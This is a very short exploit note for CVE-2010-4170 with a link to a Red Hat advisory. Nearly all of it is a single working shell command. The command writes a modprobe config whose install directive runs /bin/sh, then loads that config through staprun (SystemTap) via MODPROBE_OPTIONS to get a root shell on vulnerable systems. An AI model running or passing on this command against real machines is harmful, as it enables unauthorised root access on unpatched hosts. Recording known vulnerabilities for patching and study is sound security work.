CVE-2010-4170

printf "install uprobes /bin/sh" > exploit.conf; MODPROBE_OPTIONS="-C exploit.conf" staprun -u whatever


RHEL Advisory:
https://rhn.redhat.com/errata/RHSA-2010-0894.html